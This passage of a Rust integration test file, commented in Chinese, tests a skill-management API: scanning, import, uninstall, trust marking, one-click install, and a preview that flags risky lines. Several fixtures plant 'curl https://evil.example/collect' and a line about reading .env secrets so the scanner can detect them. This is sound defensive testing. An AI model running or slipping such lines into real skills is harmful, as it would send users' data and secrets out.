    write_skill_dir(&source, "already", "同名的另一份", &[]);
    // 杂物：没有 SKILL.md 的目录不进清单
    std::fs::create_dir_all(source.join("junk")).unwrap();

    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let skills = body["skills"].as_array().unwrap();
    let names: Vec<&str> = skills.iter().map(|s| s["name"].as_str().unwrap()).collect();
    assert!(names.contains(&"scan-me"), "{body}");
    assert!(!names.contains(&"junk"), "杂物不得进清单：{body}");

    let already = skills.iter().find(|s| s["name"] == "already").unwrap();
    assert_eq!(already["exists"], true, "已在技能根里须标记：{body}");
    let scan_me = skills.iter().find(|s| s["name"] == "scan-me").unwrap();
    assert_eq!(scan_me["exists"], false);
}

/// 扫描返回 `description`（界面的「可用技能目录」靠它展示）。
#[tokio::test]
async fn scan_carries_frontmatter_description() {
    let api = api().await;
    let source = api._home.scratch_dir("described");
    let dir = source.join("desc");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("SKILL.md"),
        "---\nname: desc\ndescription: 拷问设计树\n---\n\n正文",
    )
    .unwrap();

    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skills"][0]["description"], "拷问设计树");
}

/// 扫描一个不存在的目录 → 400（不是 500，也不是空清单）。
#[tokio::test]
async fn scan_of_missing_root_is_rejected() {
    let api = api().await;
    let (status, body) = get(&api, "/skills/scan?root=/definitely/not/here").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
}

/// 目录导入支持批量：逐项结果，一项坏不中断整批。
#[tokio::test]
async fn import_dir_reports_per_item_without_aborting_the_batch() {
    let api = api().await;
    let source = api._home.scratch_dir("batch");
    let good = write_skill_dir(&source, "good", "好技能", &[]);
    let also = write_skill_dir(&source, "also-good", "另一个好技能", &[]);
    // 坏项：目录里没有 SKILL.md
    let bad = source.join("bad");
    std::fs::create_dir_all(&bad).unwrap();
    std::fs::write(bad.join("readme.md"), "杂物").unwrap();

    let (status, body) = post(
        &api,
        "/skills/import-dir",
        serde_json::json!({
            "paths": [good, bad, also],
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["succeeded"], 2, "{body}");
    assert_eq!(body["failed"], 1, "{body}");
    let results = body["results"].as_array().unwrap();
    assert_eq!(results.len(), 3, "逐项结果一项不落：{body}");
    assert_eq!(results[1]["ok"], false, "{body}");

    // 好的两项确实落盘了（一个坏项没有中断整批）
    let root = skills_root(&api);
    assert!(root.join("good/SKILL.md").is_file());
    assert!(root.join("also-good/SKILL.md").is_file());
}

/// ⑤ 卸载后引用报错——技能名是唯一身份，不得静默降级（票 09 的核心不变量）。
///
/// 两条路径都断言：卸载本身成功（**不**因被引用而拒绝，否则制造「想卸载得先改配置、
/// 想改配置得先卸载」的先后依赖），以及随后的 `PUT /stage-configs` fail fast。
#[tokio::test]
async fn uninstall_then_referencing_config_fails_fast() {
    let api = api().await;

    // 先装一个技能并把它写进阶段配置
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("referenced", "被引用的技能正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"skills_json": ["referenced"]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "装着的时候写入应当通过：{body}");

    // `GET /skills` 提前告知「这个技能被哪些配置引用」（卸载前看得到后果）
    let (_, body) = get(&api, "/skills").await;
    let entry = body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .find(|s| s["name"] == "referenced")
        .unwrap()
        .clone();
    let declared = entry["declared_in"].as_array().unwrap();
    assert!(
        declared
            .iter()
            .any(|d| d.as_str().unwrap().contains("architect-design")),
        "须报出引用它的阶段：{entry}"
    );

    // 卸载：允许（引用完整性不在这里拦）
    let (status, body) = delete(&api, "/skills/referenced").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(!skills_root(&api).join("referenced").exists());

    // 卸载后写入引用它的配置 → 400 fail fast，且报文含技能名
    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"skills_json": ["referenced"]}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("referenced"),
        "{body}"
    );
}

/// 卸载不存在的技能 → 404；工具型技能（PATH 可执行文件）→ 400。
#[tokio::test]
async fn uninstall_unknown_skill_is_404() {
    let api = api().await;
    let (status, body) = delete(&api, "/skills/no-such-skill").await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
}

/// 本机无网时票 09 的功能全部可用——本端点组不依赖任何网络（票 09 最后一条验收项）。
///
/// 断言的是「导入 / 列表 / 扫描」三段全链路在纯本地路径下跑通，没有需要出网的环节。
#[tokio::test]
async fn skill_market_works_fully_offline() {
    let api = api().await;
    let source = api._home.scratch_dir("offline-src");
    write_skill_dir(&source, "offline", "离线正文", &[]);

    // 扫描 → 目录导入 → 列表，全程本地
    let (status, body) = get(&api, &format!("/skills/scan?root={}", source.display())).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, body) = post(
        &api,
        "/skills/import-dir",
        serde_json::json!({"paths": [source.join("offline")]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["succeeded"], 1, "{body}");
    let (status, body) = get(&api, "/skills").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["name"] == "offline"));
}

/// 空请求体 → 400（而不是把空字节当 zip 解析后报一个难懂的 IO 错）。
#[tokio::test]
async fn import_empty_body_is_rejected() {
    let api = api().await;
    let (status, body) = post_zip(&api, "/skills/import", Vec::new()).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("为空"), "{body}");
}

/// 含路径分隔符的技能名被拒（`?name=a/b`）——否则会出现「装得进、列不出、删不掉」的状态。
#[tokio::test]
async fn import_rejects_skill_name_with_separator() {
    let api = api().await;
    let zip = zip_bytes(&[("SKILL.md", "平铺的正文")]);
    let (status, body) = post_zip(&api, "/skills/import?name=a%2Fb", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("路径分隔符"),
        "{body}"
    );
    assert!(!skills_root(&api).join("a").exists(), "拒绝后不得落盘");
}

/// 平铺打包的 zip（`SKILL.md` 在包根）配上显式技能名即可安装。
#[tokio::test]
async fn import_flat_zip_with_explicit_name() {
    let api = api().await;
    let zip = zip_bytes(&[("SKILL.md", "平铺打包的正文"), ("tests.md", "兄弟")]);
    let (status, body) = post_zip(&api, "/skills/import?name=flat", zip).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "flat");
    assert!(skills_root(&api).join("flat/SKILL.md").is_file());
    assert!(skills_root(&api).join("flat/tests.md").is_file());
}

/// 平铺 zip 不给名 → 400 并说明「须显式指定技能名」，而不是猜一个名字。
#[tokio::test]
async fn import_flat_zip_without_name_is_rejected() {
    let api = api().await;
    let zip = zip_bytes(&[("SKILL.md", "平铺的正文")]);
    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("显式指定技能名"),
        "{body}"
    );
}

// ═════════════ 技能市场（决策 194）：契约用例搬到 `tests/market.rs` ═════════════
//
// 旧的那组（自定 `/index.json` registry、注入 testkit `FakeMarket`）随决策 194 整层退场。
// 新的契约用例不走替身：testkit 起一个**离线 smart HTTP 的 git 仓**，后端注入真的
// `Libgit2Repo`——于是传输、shallow、钉 commit 这几条只有真 libgit2 才打得到的路径都在
// 契约层被钉住。用例在 `crates/app/tests/integration/market.rs`。
// ═══════════════ 装前预览与信任标记（决策 172④⑤，票 11）═══════════════
//
// 四条契约用例对应票面验收清单：预览返回三项 / 特征命中列出具体行 / 未信任 + 全文被拒 /
// 信任转换生效；另加三条把「装前」这一半（包还没落盘就先看）与拒绝路径钉住。
// 全部离线——预览不装、不下载、不联网。

/// 预览返回三项：① 推荐去向（阶段 + 理由）② 注入模式与信任态 ③ 正文特征扫描。
#[tokio::test]
async fn preview_returns_recommendations_declarations_and_features() {
    let api = api().await;
    // 推荐表里的技能名（票 16 的推荐清单是同一份数据）
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("grilling", "拷问协议正文，不涉及网络。", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = get(&api, "/skills/grilling/preview").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["name"], "grilling");
    assert_eq!(body["body_available"], true);

    // ① 推荐去向
    let recs = body["recommendations"].as_array().unwrap();
    assert_eq!(recs.len(), 1, "grilling 只推荐给 architect-design：{body}");
    assert_eq!(recs[0]["stage"], "architect-design");
    assert!(
        !recs[0]["reason"].as_str().unwrap().is_empty(),
        "推荐须带理由：{body}"
    );

    // ② 注入模式与信任态（取自声明本身，不另存一份账）
    let decls = body["declarations"].as_array().unwrap();
    assert_eq!(decls.len(), 1, "{body}");
    assert_eq!(decls[0]["declared_in"], "阶段 architect-design");
    assert_eq!(decls[0]["mode"], "name");
    assert_eq!(decls[0]["trusted"], false);
    assert_eq!(decls[0]["bare"], false);

    // ③ 正文无命中时不造噪声
    assert_eq!(body["features"]["hits"].as_array().unwrap().len(), 0);
    assert_eq!(body["features"]["counts"]["network"], 0);
}

/// 特征命中**列出具体行**（不是布尔「有风险」）：行号对着源文件能直接定位。
#[tokio::test]
async fn preview_lists_feature_hits_with_concrete_lines() {
    let api = api().await;
    // `write_skill_dir` 的落盘形态是 1:`---` 2:`name: …` 3:`---` 4:空 5:正文首行 …
    // 故正文第 2 行（网络）落在文件第 6 行、第 3 行（密钥路径）落在第 7 行。
    let root = skills_root(&api);
    write_skill_dir(
        &root,
        "risky",
        "第一行：没有任何特征\n第二行：curl https://evil.example/collect\n第三行：读取 .env 里的密钥",
        &[],
    );

    let (status, body) = get(&api, "/skills/risky/preview").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let hits = body["features"]["hits"].as_array().unwrap();
    assert_eq!(hits.len(), 2, "两类特征各一条：{body}");

    let net = hits.iter().find(|h| h["kind"] == "network").unwrap();
    assert_eq!(net["line"], 6, "命中行必须是源文件里的行号：{body}");
    assert!(net["text"].as_str().unwrap().contains("curl"), "{body}");
    assert_eq!(net["label"], "网络调用");

    let cred = hits.iter().find(|h| h["kind"] == "credentials").unwrap();
    assert_eq!(cred["line"], 7, "{body}");
    assert_eq!(cred["label"], "密钥路径");

    assert_eq!(body["features"]["counts"]["network"], 1);
    assert_eq!(body["features"]["counts"]["credentials"], 1);
    assert_eq!(body["features"]["counts"]["run_command"], 0);
}

/// 未信任 + 全文模式**保存被拒**（票 05 的门在技能工作流里的入口）。
///
/// 同一条技能改成名字态就能存——「未信任仍可用于名字态」是票面明写的另一半。
#[tokio::test]
async fn untrusted_skill_cannot_be_saved_in_full_mode() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "full", "trusted": false}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("grilling") && err.contains("信任"), "{body}");
    assert!(
        err.contains("name"),
        "报错须给出可操作的去处（改用 name 模式）：{body}"
    );
    // 拒绝的写入不落库
    assert!(
        api.state
            .store
            .get_stage_config("architect-design")
            .await
            .unwrap()
            .is_none(),
        "被拒的写入不得留下半份配置"
    );

    // 名字态可以存（正文由 Skill 工具按需拉取）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 信任转换生效：显式动作把引用该技能的声明**全部**转成已信任，之后全文模式可存。
#[tokio::test]
async fn trust_conversion_takes_effect_and_unlocks_full_mode() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);
    // 阶段级 + 节点级各声明一次：转换要覆盖两处
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "name", "trusted": false}],
            "node_overrides_json": {
                "validate_input": {"skills": [{"name": "grilling", "mode": "name", "trusted": false}]}
            }
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = put(
        &api,
        "/skills/grilling/trust",
        serde_json::json!({"trusted": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["trusted"], true);
    assert_eq!(body["changed"], 1);
    assert_eq!(body["updated_stages"][0], "architect-design");

    // 两处都转了
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    let decls = agentpipeline_core::config::declared_skill_decls(&stored);
    assert_eq!(decls.len(), 2, "{decls:?}");
    assert!(decls.iter().all(|(_, d)| d.trusted), "{decls:?}");

    // 预览的第 ② 项跟着变
    let (_, body) = get(&api, "/skills/grilling/preview").await;
    let decls = body["declarations"].as_array().unwrap();
    assert_eq!(decls.len(), 2, "{body}");
    assert!(decls.iter().all(|d| d["trusted"] == true), "{body}");

    // 全文模式现在可存
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "full", "trusted": true}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 撤销信任撞上全文模式时**拒绝**，且报错可操作（不静默降级成名字态）。
#[tokio::test]
async fn revoking_trust_on_a_full_declaration_is_refused() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "skills_json": [{"name": "grilling", "mode": "full", "trusted": true}]
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/skills/grilling/trust",
        serde_json::json!({"trusted": false}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("full") && err.contains("name"), "{body}");

    // 配置一字未动（拒绝是整体的，不是写了一半）
    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    let decls = agentpipeline_core::config::declared_skill_decls(&stored);
    assert!(decls[0].1.trusted, "被拒的转换不得改动配置");
}

/// 信任转换对**没引用该技能**的配置是空操作，并如实回报（不假装改了什么）。
#[tokio::test]
async fn trust_conversion_reports_when_nothing_references_the_skill() {
    let api = api().await;
    let (status, _) = post_zip(&api, "/skills/import", skill_zip("grilling", "正文", &[])).await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = put(
        &api,
        "/skills/grilling/trust",
        serde_json::json!({"trusted": true}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["changed"], 0);
    assert!(body["updated_stages"].as_array().unwrap().is_empty());
    assert!(
        body["note"].as_str().unwrap().contains("引用"),
        "空操作要说清为什么：{body}"
    );
}

/// **装前**预览：包还没落盘就能看三项（③ 扫的是包里的字节），且不落任何文件。
#[tokio::test]
async fn preview_of_an_incoming_package_does_not_install_it() {
    let api = api().await;
    let zip = skill_zip(
        "grilling",
        "正文第一行\n第二行 curl https://evil.example/collect",
        &[("notes.md", "兄弟")],
    );

    let (status, body) = post_zip(&api, "/skills/preview", zip).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["name"], "grilling");
    assert_eq!(body["install"]["sibling_count"], 1);
    assert_eq!(
        body["recommendations"][0]["stage"], "architect-design",
        "推荐去向按名字给，装之前就成立：{body}"
    );
    let hits = body["features"]["hits"].as_array().unwrap();
    let net = hits.iter().find(|h| h["kind"] == "network").unwrap();
    // 包内正文同样带 frontmatter 三行 + 一个空行
    assert_eq!(net["line"], 6, "{body}");
    // 尚未被任何配置引用 → 空清单 + 默认形态说明
    assert!(body["declarations"].as_array().unwrap().is_empty());
    assert_eq!(body["defaults"]["mode"], "name");
    assert_eq!(body["defaults"]["trusted"], false);

    // 预览不是安装
    assert!(!skills_root(&api).join("grilling").exists(), "预览不得落盘");
}

/// 预览一个不存在的已安装技能 → 404（对空三项返回一堆「无」比报错更误导）。
#[tokio::test]
async fn preview_of_an_uninstalled_skill_is_not_found() {
    let api = api().await;
    let (status, body) = get(&api, "/skills/no-such-skill/preview").await;
    assert_eq!(status, StatusCode::NOT_FOUND, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("no-such-skill"),
        "{body}"
    );
}

// ═══════════════ 阶段推荐与一键安装（决策 172①，票 16）═══════════════
//
// 推荐清单的投递载体是界面（决策 172①）：清单本身是代码内常量，经 `/skills/recommendations`
// 下发；一键安装把它变成「技能落到技能根 + 写进该阶段配置」一步完成，且**不绕过票 11 的
// 信任确认**（未受信任的技能只能以 name 模式写入）。

/// 把技能先放进技能根（走票 09 的本地导入，不碰网络）。
///
/// 一键安装在**已装**时走决策 181⑦ 的「已在技能根里 → 不重新下载」那条路，于是本文件的
/// 阶段推荐/一键安装用例可以继续用「仓访问层指向关闭端口」的 harness（零网络）。
/// **下载那条链路由 `crates/app/tests/integration/market.rs` 用真 fixture 覆盖**（那里注入的是指向
/// 离线 smart HTTP 的真 `Libgit2Repo`）；本文件测的是**落点**：写进阶段配置 + 三项预览
/// ——那件事与二进制从哪儿来无关，而把真网络搬进来只会让这两层重复。
async fn seed_installed_skill(api: &Api, name: &str, body: &str) {
    let (status, body) = post_zip(api, "/skills/import", skill_zip(name, body, &[])).await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 推荐清单按阶段下发，并如实标注「装没装」（未安装的项界面据此显示「未安装」而不是崩掉）。
#[tokio::test]
async fn recommendations_list_stages_with_install_state() {
    let api = api().await;
    // 先装一个推荐技能（列表里的名字之一）
    write_skill_dir(&skills_root(&api), "grilling", "拷问协议正文", &[]);

    let (status, body) = get(&api, "/skills/recommendations").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let stages = body["stages"].as_array().unwrap();
    assert_eq!(stages.len(), 6, "推荐清单覆盖六个阶段：{body}");

    let architect = stages
        .iter()
        .find(|s| s["stage"] == "architect-design")
        .expect("architect-design 应有推荐");
    let names: Vec<&str> = architect["skills"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["name"].as_str().unwrap())
        .collect();
    assert_eq!(names, vec!["grilling", "domain-modeling"], "{body}");

    let grill = &architect["skills"][0];
    assert_eq!(grill["installed"], true, "装过的标已安装：{body}");
    assert!(!grill["reason"].as_str().unwrap().is_empty(), "{body}");
    // 未装的那个如实标 false（界面显示「未安装」）
    assert_eq!(architect["skills"][1]["installed"], false, "{body}");
}

/// 推荐清单的每行还要给出**机器可读**的「本阶段是否已声明」（票 01）。
///
/// 界面据此决定那一行给的是「安装」还是「启用」——票 16 那句「已安装的可直接启用」落地前的
/// 缺口正在这里：只有 `installed` 时，一个已装但本阶段没启用的技能在行上既没有按钮、也不是
/// 「已启用」（本机十个推荐行全部已装，于是一枚按钮都不出现）。
///
/// **为什么不复用 `declared_in`**：它是给人看的位置说明（`阶段 <key>` / `阶段 <key> 节点 <node>`），
/// 界面拿它判断「是不是本阶段」就等于 parse 文案。故三态逐格断言，且**同名技能的相邻两行
/// 必须给出不同答案**——推荐清单里 `tdd` 同时挂在 test-design 与 develop 两行上。
#[tokio::test]
async fn recommendations_report_whether_each_skill_is_declared_in_that_stage() {
    let api = api().await;
    seed_installed_skill(&api, "grilling", "拷问协议正文。").await;
    seed_installed_skill(&api, "tdd", "测试先行。").await;
    // code-review 走**节点级**声明，用来钉住「节点级也算本阶段」那一格
    seed_installed_skill(&api, "code-review", "两轴评审。").await;

    // grilling 在 **architect-design 阶段级**声明；tdd 只声明在 **test-design**。
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"skills_json": ["grilling"]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, body) = put(
        &api,
        "/stage-configs/test-design",
        serde_json::json!({"skills_json": ["tdd"]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let (status, body) = put(
        &api,
        "/stage-configs/review",
        serde_json::json!({
            "node_overrides_json": {"execute": {"skills": ["code-review"]}},
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = get(&api, "/skills/recommendations").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let stages = body["stages"].as_array().unwrap();
    let row = |stage: &str, name: &str| -> serde_json::Value {
        stages
            .iter()
            .find(|s| s["stage"] == stage)
            .expect("该阶段应有推荐")
            .clone()["skills"]
            .as_array()
            .unwrap()
            .iter()
            .find(|k| k["name"] == name)
            .expect("该技能应有推荐行")
            .clone()
    };

    // ① 已装 + 本阶段已声明 → 两个判定都是真（界面保持只读标签）
    let grill = row("architect-design", "grilling");
    assert_eq!(grill["installed"], true, "{grill}");
    assert_eq!(grill["declared_here"], true, "本阶段声明过它：{grill}");
    assert_eq!(
        grill["declared_in"].as_array().unwrap().len(),
        1,
        "位置说明（展示串）照旧下发：{grill}"
    );

    // ② 已装 + 本阶段**没**声明 → installed true 而 declared_here false（界面给「启用」）
    let tdd_develop = row("develop", "tdd");
    assert_eq!(tdd_develop["installed"], true, "{tdd_develop}");
    assert_eq!(
        tdd_develop["declared_here"], false,
        "tdd 声明在 test-design，develop 这一行不该算已启用：{tdd_develop}"
    );

    // ③ 同一个技能在它真正被声明的那个阶段上 → declared_here true
    //    （这一对是本判定的牙齿：按名字全局回答会让 ② 也变成真）
    let tdd_test_design = row("test-design", "tdd");
    assert_eq!(tdd_test_design["declared_here"], true, "{tdd_test_design}");

    // ④ 未装 + 未声明 → 两个都是假（界面给「安装」）
    let domain = row("architect-design", "domain-modeling");
    assert_eq!(domain["installed"], false, "{domain}");
    assert_eq!(domain["declared_here"], false, "{domain}");

    // ⑤ 节点级声明也算本阶段声明（不然那一行会白给一颗「启用」）
    let review = row("review", "code-review");
    assert_eq!(review["declared_here"], true, "节点级声明也算：{review}");

    // ⑥ 来源定位（决策 194）：清单是**指针**——仓 + 仓内目录，**不含 commit**（钉死 commit 会
    //    随上游漂移变成一份陈旧名录；commit 由技能市场在浏览那一刻补上）。界面把这些摆给用户
    //    看，才有「照着这个仓的哪一份装」可言。
    //
    //    **null 这一格打不出来**：行的名字取自 `recommended_skill_names`（同一个清单），
    //    定位又按同一个 `(阶段, 名字)` 回来，`find` 必然命中——所以「不在清单里 → null」这条
    //    分支在本端点上**不可达**，类型与界面容得下它只是防御（见字段注释）。硬造一个用例
    //    只会变成「喂一个端点不会产生的形态」，故这里只钉真实契约：两个键都在、都是真值。
    assert_eq!(grill["repo"], "mattpocock/skills", "{grill}");
    assert_eq!(grill["dir"], "skills/productivity/grilling", "{grill}");
    for stage in stages {
        for skill in stage["skills"].as_array().unwrap() {
            let repo = skill["repo"]
                .as_str()
                .expect("repo 必须是字符串（不是 null、不是别的类型）");
            let dir = skill["dir"]
                .as_str()
                .expect("dir 必须是字符串（不是 null、不是别的类型）");
            assert!(
                repo.split_once('/')
                    .is_some_and(|(o, r)| !o.is_empty() && !r.is_empty()),
                "来源仓是 owner/repo 形态：{skill}"
            );
            assert!(!dir.is_empty(), "目录不能是空的：{skill}");
            assert!(
                skill.get("commit").is_none(),
                "清单是指针不是名录，不下发 commit：{skill}"
            );
        }
    }
}

/// 一键安装：技能落到技能根 **且** 写进该阶段配置，一次请求完成。
#[tokio::test]
async fn one_click_install_lands_the_skill_and_writes_the_stage_config() {
    let api = api().await;
    seed_installed_skill(&api, "grilling", "拷问协议正文。").await;

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "grilling");
    // 落盘（技能根里那份就是它）
    assert!(skills_root(&api).join("grilling/SKILL.md").is_file());
    // 已装且就是要启用那一份 → **不重新下载**，且这件事要说出来（决策 181⑦）
    assert!(
        body["note"].as_str().unwrap().contains("未重新下载"),
        "跳过下载须说出声：{body}"
    );

    // 写进配置，且是 **name + 未信任**
    let decls = &body["stage_config"]["skills_json"];
    assert_eq!(decls[0]["name"], "grilling", "{body}");
    assert_eq!(decls[0]["mode"], "name", "{body}");
    assert_eq!(decls[0]["trusted"], false, "{body}");

    let stored = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    let parsed = agentpipeline_core::config::declared_skill_decls(&stored);
    assert_eq!(parsed.len(), 1, "{parsed:?}");
    assert_eq!(
        parsed[0].1.mode,
        agentpipeline_core::agent::skills::SkillMode::Name
    );
    assert!(!parsed[0].1.trusted);

    // 响应带三项预览：装完立刻把特征命中摆给用户看（票 11 的预览不被绕过）
    let hits = body["preview"]["features"]["hits"].as_array().unwrap();
    assert!(hits.is_empty(), "这份正文干净：{body}");
    assert_eq!(body["preview"]["declarations"][0]["mode"], "name", "{body}");
    assert_eq!(
        body["preview"]["recommendations"][0]["stage"], "architect-design",
        "{body}"
    );
}

/// 一键安装**不给全文模式**：正文里有特征也一样进得来，但注入形态只能是名字态。
#[tokio::test]
async fn one_click_install_never_writes_full_mode_for_an_untrusted_skill() {
    let api = api().await;
    // 正文里放一行 curl：特征是**报出来**（告知），不是拦安装
    seed_installed_skill(&api, "grilling", "第一行\n第二行 curl https://evil.example").await;

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["skills_json"][0]["mode"], "name");
    // 特征命中如实报出来（告知，不拦安装）
    let net = body["preview"]["features"]["hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|h| h["kind"] == "network")
        .expect("网络特征应被报出");
    assert_eq!(net["line"], 6, "{body}");
    assert!(net["text"].as_str().unwrap().contains("curl"), "{body}");
}

/// 一键安装保留既有声明（只增不减）；重复安装也不产生重复条目——
/// 但第二次会被票 09 的「同名不覆盖」拒掉（409），**不是**静默幂等。
#[tokio::test]
async fn one_click_install_keeps_existing_declarations_and_never_duplicates_them() {
    let api = api().await;
    // 既有声明指向的技能必须真的在可用池里，否则这条 PUT 会先被准入挡下（测不到想测的事）
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("domain-modeling", "领域建模正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    // 要一键装的那个也先在技能根里（同样是为了零网络，见 `seed_installed_skill`）
    seed_installed_skill(&api, "grilling", "拷问协议正文。").await;
    // 先有一条阶段级声明（老格式裸字符串）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"skills_json": ["domain-modeling"]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let decls = body["stage_config"]["skills_json"].as_array().unwrap();
    assert_eq!(decls.len(), 2, "{body}");
    assert_eq!(decls[0], "domain-modeling", "既有声明逐字保留：{body}");

    // 再装一次：技能已在技能根里 → **不重新下载**（票 09 的同名不覆盖没松动），
    // 只补「启用」那一步；`note` 如实说明发生了什么，条目一条都不重复
    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(
        body["note"].as_str().unwrap().contains("已在技能根里"),
        "未重新下载须说出来，不能静默跳过：{body}"
    );
    assert_eq!(
        body["stage_config"]["skills_json"]
            .as_array()
            .unwrap()
            .len(),
        2,
        "重复安装不得产生重复条目：{body}"
    );
    // **`overwrite: true` 不在这一层测**：它走的是"回来源仓重新取一份"那条路（覆盖换的是
    // 技能根里的字节，不是配置里的条目），这里没有可用的来源仓。那一条由
    // `crates/app/tests/integration/market.rs` 的 `conflict_names_the_recorded_origin_and_overwrite_replaces`
    // 用真 fixture 覆盖（含"覆盖之后 `note` 为空、配置条目仍是一条"）。
}

/// 票 16「已安装的可直接启用」：技能已在技能根里、只是没写进这个阶段时，
/// 安装按钮（界面按 `installed` 显示为「启用」）要能把它落进配置。
///
/// 刻意用**没配市场来源**的 api：这条路上一次网络请求都不该发生，故不该因为
/// 「市场未配置」而被拒——拒绝远程安装的那条规则在这里没有对象。
#[tokio::test]
async fn one_click_install_enables_an_already_installed_skill() {
    let api = api().await;
    let (status, _) = post_zip(
        &api,
        "/skills/import",
        skill_zip("grilling", "拷问协议正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK);

    let (status, body) = post(
        &api,
        "/skills/install",
        serde_json::json!({"stage": "architect-design", "name": "grilling"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
